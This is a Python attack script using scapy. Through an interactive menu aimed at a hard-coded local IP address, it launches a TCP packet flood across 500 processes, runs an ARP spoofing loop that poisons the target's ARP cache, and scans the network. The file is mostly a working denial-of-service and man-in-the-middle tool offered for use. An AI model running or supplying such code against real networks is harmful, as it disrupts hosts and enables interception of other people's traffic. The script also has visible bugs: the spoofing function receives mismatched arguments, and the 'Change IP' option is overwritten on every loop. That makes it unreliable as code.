from scapy.all import *
from multiprocessing import Process, Event
import time

def dos(target_ip: str, stop_event) -> None:
    while not stop_event.is_set():
        # Send a TCP packet to the destination IP
        send(IP(dst=target_ip) / TCP(sport=1234, dport=1234)) # type: ignore

def arp_spoof(target_ip: str, spoof_ip: str) -> None:
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for IP: {target_ip}")
        return
    while True:
        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac))
        time.sleep(2)

def start_attack(attack_func, target, processes, stop_event, *args, num_processes=1):
    if input(f"You are about to start an attack on {target}. Press Enter to continue or any other key to cancel: ") == "":
        stop_event.clear()
        for _ in range(num_processes):
            process = Process(target=attack_func, args=(target, stop_event, *args))
            process.start()
            processes.append(process)
        input("Press Enter to cancel the attack")
        stop_event.set()
        for process in processes:
            process.terminate()
            process.join()
        print("You stopped the attack")
        processes.clear()
        print("Worker process stopped.")

def scan_network(network: str) -> None:
    print(f"Scanning network {network}...")
    ans, _ = arping(network)
    for sent, received in ans:
        print(f"IP: {received.psrc} MAC: {received.hwsrc}")

if __name__ == "__main__":
    stop_event = Event()
    while True:
        target = "192.168.137.34"
        processes = []
        match input("Decide what you want to do:\n1: attacks\n2: Change IP\n3: Scan Network\n4: Exit\n"):
            case "1":
                match input("What attack do you want to launch?\n1: DoS\n2: ARP spoofing\n3: Port scanning\n4: Back\n"):
                    case "1":
                        start_attack(dos, target, processes, stop_event, num_processes=500)
                    case "2":
                        spoof_ip = input("Enter the IP address to spoof: ")
                        start_attack(arp_spoof, target, processes, stop_event, spoof_ip)
                    case "3":
                        # Add port scanning logic here if needed
                        pass
                    case "4":
                        continue
            case "2":
                target = input("Enter the new target IP: ")
            case "3":
                network = input("Enter the network to scan (e.g., 192.168.1.0/24): ")
                scan_network(network)
            case "4":
                break
            case _:
                print("Invalid input")
                continue
